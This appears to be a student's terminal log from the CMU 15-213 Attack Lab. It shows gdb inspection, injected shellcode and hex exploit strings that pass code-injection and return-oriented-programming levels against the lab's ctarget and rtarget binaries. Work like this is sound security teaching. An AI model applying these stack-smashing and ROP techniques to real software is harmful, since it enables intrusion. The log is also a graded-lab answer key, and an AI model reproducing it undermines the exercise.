+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 B6 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 7F 1A 40 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ gdb ctarget 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) b *0x401a24
+Breakpoint 1 at 0x401a24: file visible.c, line 90.
+(gdb) r -q
+Starting program: /home/jovyan/lab3/target35/ctarget -q
+Cookie: 0x30cd1ee4
+
+Breakpoint 1, test () at visible.c:90
+90      visible.c: No such file or directory.
+(gdb) i r $rso
+Invalid register `rso'
+(gdb) i r $rsp
+rsp            0x5563e960       0x5563e960
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 1128] will be killed.
+
+Quit anyway? (y or n) y
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -c 3raw.s -o l3.o 
+3raw.s: Assembler messages:
+3raw.s: Warning: end of file not at end of a line; newline inserted
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump l3.o -d
+
+l3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 60 e9 63 55    mov    $0x5563e960,%rdi
+   7:   68 b6 19 40 00          pushq  $0x4019b6
+   c:   c3                      retq   
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 60 E9 63 55 68 B6 19 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Misfire: You called touch3("")
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:3:48 C7 C7 60 E9 63 55 68 B6 19 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Misfire: You called touch3("")
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:3:48 C7 C7 60 E9 63 55 68 B6 19 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 E9 63 55 18 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ gdb ctarget 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) b *0x401a2d
+Breakpoint 1 at 0x401a2d: file visible.c, line 92.
+(gdb) r -q
+Starting program: /home/jovyan/lab3/target35/ctarget -q
+Cookie: 0x30cd1ee4
+
+Breakpoint 1, 0x0000000000401a2d in test () at visible.c:92
+92      visible.c: No such file or directory.
+(gdb) i r $rsp
+rsp            0x5563e958       0x5563e958
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 1199] will be killed.
+
+Quit anyway? (y or n) y
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Touch3!: You called touch3("30cd1ee4")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:PASS:0xffffffff:ctarget:3:48 C7 C7 58 E9 63 55 68 B6 19 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget
+Cookie: 0x30cd1ee4
+Type string:Touch3!: You called touch3("30cd1ee4")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget
+Cookie: 0x30cd1ee4
+Type string:Touch3!: You called touch3("30cd1ee4")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc
+gcc: fatal error: no input files
+compilation terminated.
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc farm.c farm
+gcc: error: farm: No such file or directory
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc farm.c >farm
+/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o: In function `_start':
+(.text+0x20): undefined reference to `main'
+collect2: error: ld returned 1 exit status
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump farm >farm.o
+Usage: objdump <option(s)> <file(s)>
+ Display information from object <file(s)>.
+ At least one of the following switches must be given:
+  -a, --archive-headers    Display archive header information
+  -f, --file-headers       Display the contents of the overall file header
+  -p, --private-headers    Display object format specific file header contents
+  -P, --private=OPT,OPT... Display object format specific contents
+  -h, --[section-]headers  Display the contents of the section headers
+  -x, --all-headers        Display the contents of all headers
+  -d, --disassemble        Display assembler contents of executable sections
+  -D, --disassemble-all    Display assembler contents of all sections
+  -S, --source             Intermix source code with disassembly
+  -s, --full-contents      Display the full contents of all sections requested
+  -g, --debugging          Display debug information in object file
+  -e, --debugging-tags     Display debug information using ctags style
+  -G, --stabs              Display (in raw form) any STABS info in the file
+  -W[lLiaprmfFsoRtUuTgAckK] or
+  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,
+          =frames-interp,=str,=loc,=Ranges,=pubtypes,
+          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,
+          =addr,=cu_index,=links,=follow-links]
+                           Display DWARF info in the file
+  -t, --syms               Display the contents of the symbol table(s)
+  -T, --dynamic-syms       Display the contents of the dynamic symbol table
+  -r, --reloc              Display the relocation entries in the file
+  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
+  @<file>                  Read options from <file>
+  -v, --version            Display this program's version number
+  -i, --info               List object formats and architectures supported
+  -H, --help               Display this information
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump farm -o >  farm.o -d
+objdump: invalid option -- 'o'
+Usage: objdump <option(s)> <file(s)>
+ Display information from object <file(s)>.
+ At least one of the following switches must be given:
+  -a, --archive-headers    Display archive header information
+  -f, --file-headers       Display the contents of the overall file header
+  -p, --private-headers    Display object format specific file header contents
+  -P, --private=OPT,OPT... Display object format specific contents
+  -h, --[section-]headers  Display the contents of the section headers
+  -x, --all-headers        Display the contents of all headers
+  -d, --disassemble        Display assembler contents of executable sections
+  -D, --disassemble-all    Display assembler contents of all sections
+  -S, --source             Intermix source code with disassembly
+  -s, --full-contents      Display the full contents of all sections requested
+  -g, --debugging          Display debug information in object file
+  -e, --debugging-tags     Display debug information using ctags style
+  -G, --stabs              Display (in raw form) any STABS info in the file
+  -W[lLiaprmfFsoRtUuTgAckK] or
+  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,
+          =frames-interp,=str,=loc,=Ranges,=pubtypes,
+          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,
+          =addr,=cu_index,=links,=follow-links]
+                           Display DWARF info in the file
+  -t, --syms               Display the contents of the symbol table(s)
+  -T, --dynamic-syms       Display the contents of the dynamic symbol table
+  -r, --reloc              Display the relocation entries in the file
+  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
+  @<file>                  Read options from <file>
+  -v, --version            Display this program's version number
+  -i, --info               List object formats and architectures supported
+  -H, --help               Display this information
+
+ The following switches are optional:
+  -b, --target=BFDNAME           Specify the target object format as BFDNAME
+  -m, --architecture=MACHINE     Specify the target architecture as MACHINE
+  -j, --section=NAME             Only display information for section NAME
+  -M, --disassembler-options=OPT Pass text OPT on to the disassembler
+  -EB --endian=big               Assume big endian format when disassembling
+  -EL --endian=little            Assume little endian format when disassembling
+      --file-start-context       Include context from start of file (with -S)
+  -I, --include=DIR              Add DIR to search list for source files
+  -l, --line-numbers             Include line numbers and filenames in output
+  -F, --file-offsets             Include file offsets when displaying information
+  -C, --demangle[=STYLE]         Decode mangled/processed symbol names
+                                  The STYLE, if specified, can be `auto', `gnu',
+                                  `lucid', `arm', `hp', `edg', `gnu-v3', `java'
+                                  or `gnat'
+      --recurse-limit            Enable a limit on recursion whilst demangling.  [Default]
+      --no-recurse-limit         Disable a limit on recursion whilst demangling
+  -w, --wide                     Format output for more than 80 columns
+  -z, --disassemble-zeroes       Do not skip blocks of zeroes when disassembling
+      --start-address=ADDR       Only process data whose address is >= ADDR
+      --stop-address=ADDR        Only process data whose address is <= ADDR
+      --prefix-addresses         Print complete address alongside disassembly
+      --[no-]show-raw-insn       Display hex alongside symbolic disassembly
+      --insn-width=WIDTH         Display WIDTH bytes on a single line for -d
+      --adjust-vma=OFFSET        Add OFFSET to all displayed section addresses
+      --special-syms             Include special symbols in symbol dumps
+      --inlines                  Print all inlines for source line (with -l)
+      --prefix=PREFIX            Add PREFIX to absolute paths for -S
+      --prefix-strip=LEVEL       Strip initial directory names for -S
+      --dwarf-depth=N        Do not display DIEs at depth N or greater
+      --dwarf-start=N        Display DIEs starting with N, at the same depth
+                             or deeper
+      --dwarf-check          Make additional dwarf internal consistency checks.      
+
+objdump: supported targets: elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 a.out-i386-linux pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 plugin srec symbolsrec verilog tekhex binary ihex
+objdump: supported architectures: i386 i386:x86-64 i386:x64-32 i8086 i386:intel i386:x86-64:intel i386:x64-32:intel i386:nacl i386:x86-64:nacl i386:x64-32:nacl iamcu iamcu:intel l1om l1om:intel k1om k1om:intel plugin
+
+The following i386/x86-64 specific disassembler options are supported for use
+with the -M switch (multiple options should be separated by commas):
+  x86-64      Disassemble in 64bit mode
+  i386        Disassemble in 32bit mode
+  i8086       Disassemble in 16bit mode
+  att         Display instruction in AT&T syntax
+  intel       Display instruction in Intel syntax
+  att-mnemonic
+              Display instruction in AT&T mnemonic
+  intel-mnemonic
+              Display instruction in Intel mnemonic
+  addr64      Assume 64bit address size
+  addr32      Assume 32bit address size
+  addr16      Assume 16bit address size
+  data32      Assume 32bit data size
+  data16      Assume 16bit data size
+  suffix      Always display instruction suffix in AT&T syntax
+  amd64       Display instruction in AMD64 ISA
+  intel64     Display instruction in Intel64 ISA
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump farm -d
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump -d farm > farm.txt
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump -d farm > f.s
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump -d farm > f.s
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc farm.c farm
+gcc: error: farm: No such file or directory
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc farm.c 
+/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o: In function `_start':
+(.text+0x20): undefined reference to `main'
+collect2: error: ld returned 1 exit status
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc farm.c 
+/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o: In function `_start':
+(.text+0x20): undefined reference to `main'
+collect2: error: ld returned 1 exit status
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc farm.c 
+/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o: In function `_start':
+(.text+0x20): undefined reference to `main'
+collect2: error: ld returned 1 exit status
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -E farm.c -o f.i
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -S f.i -o f.s
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -o f farm.c 
+/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o: In function `_start':
+(.text+0x20): undefined reference to `main'
+collect2: error: ld returned 1 exit status
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -g -o f farm.c 
+/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o: In function `_start':
+(.text+0x20): undefined reference to `main'
+collect2: error: ld returned 1 exit status
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump -d rtarget >r.txt
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 7E 1A 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 63 1A 40 00 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+jovyan@jupyter-10225501447:~/lab3/target35$ gdb ctarget 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) b *0x40186a
+Breakpoint 1 at 0x40186a: file buf.c, line 14.
+(gdb) r -q
+Starting program: /home/jovyan/lab3/target35/ctarget -q
+Cookie: 0x30cd1ee4
+
+Breakpoint 1, getbuf () at buf.c:14
+14      buf.c: No such file or directory.
+(gdb) i r $rsp
+rsp            0x5563e918       0x5563e918
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 1631] will be killed.
+
+Quit anyway? (y or n) y
+jovyan@jupyter-10225501447:~/lab3/target35$ 
